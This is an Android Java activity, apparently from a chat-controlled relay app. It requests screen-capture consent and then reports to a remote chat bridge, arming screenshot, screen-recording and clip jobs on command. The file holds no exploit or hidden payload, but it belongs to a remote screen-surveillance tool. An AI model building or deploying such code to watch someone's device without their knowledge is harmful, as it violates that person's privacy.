package br.svc.relay;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.TextView;

/** Consentimento - blindado: qualquer erro vem pro chat com o texto exato. */
public class ShotConsentActivity extends Activity {

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            TextView tv = new TextView(this);
            tv.setText("Autorizando captura de tela…");
            tv.setTextSize(16);
            tv.setTextColor(Color.DKGRAY);
            tv.setGravity(Gravity.CENTER);
            setContentView(tv);
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(mpm.createScreenCaptureIntent(), 1001);
        } catch (Throwable t) {
            if (BridgeHolder.tg != null) BridgeHolder.tg.say("consent: CRASH onCreate: " + t);
            finish();
        }
    }

    @Override
    protected void onActivityResult(int req, int resultCode, Intent data) {
        super.onActivityResult(req, resultCode, data);
        finish(); // some na hora do INICIAR - o resto rola na thread de fundo
        new Thread(() -> {
            android.os.Looper.prepare(); // getMediaProjection cria Handler interno: exige Looper
            if (BridgeHolder.tg == null) return;
            if (req != 1001) return;
            BridgeHolder.tg.say("shot: consentimento respondido (code " + resultCode + ")");
            if (resultCode == RESULT_OK && data != null) {
                try {
                    startService(new Intent(this, CaptureService.class)); // A14: FGS mediaProjection antes
                    MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                    // retry: estado 'foreground' do FGS sobe de forma assincrona; tenta ate 5x
                    MediaProjection mp = null;
                    SecurityException ultima = null;
                    for (int tent = 0; tent < 5; tent++) {
                        try {
                            for (int espera = 0; espera < 10 && !CaptureService.noAr; espera++) {
                                try { Thread.sleep(200); } catch (InterruptedException ignored) { }
                            }
                            mp = mpm.getMediaProjection(resultCode, data);
                            break;
                        } catch (SecurityException se) {
                            ultima = se;
                            try { Thread.sleep(500); } catch (InterruptedException ignored) { }
                        }
                    }
                    if (mp == null) {
                        if (ultima != null) throw ultima;
                        BridgeHolder.tg.say("shot: projecao nula sem excecao");
                        return;
                    }
                    mp.registerCallback(new MediaProjection.Callback() {
                        @Override public void onStop() {
                            BridgeHolder.projection = null;
                            if (BridgeHolder.tg != null)
                                BridgeHolder.tg.say("projecao: sessao ENCERRADA PELO SISTEMA");
                        }
                    }, null);
                    BridgeHolder.projection = mp;
                    BridgeHolder.tg.say("shot: captura autorizada! mande 'shot' pra fotografar");
                    if (BridgeHolder.shotPendente) {
                        BridgeHolder.shotPendente = false;
                        RelayService.dispararCaptura();
                    }
                    if (BridgeHolder.recPendente > 0) {
                        int secs = BridgeHolder.recPendente;
                        BridgeHolder.recPendente = 0;
                        RelayService.dispararRec(secs);
                    }
                    if (BridgeHolder.clipPendente) {
                        BridgeHolder.clipPendente = false;
                        RelayService.armarClip();
                    }
                } catch (Throwable t) {
                    BridgeHolder.tg.say("shot: erro projecao: " + t);
                }
            } else {
                BridgeHolder.tg.say("shot: consentimento negado/cancelado");
            }
            if (android.os.Looper.myLooper() != null) android.os.Looper.myLooper().quitSafely();
        }, "consent").start();
    }
}
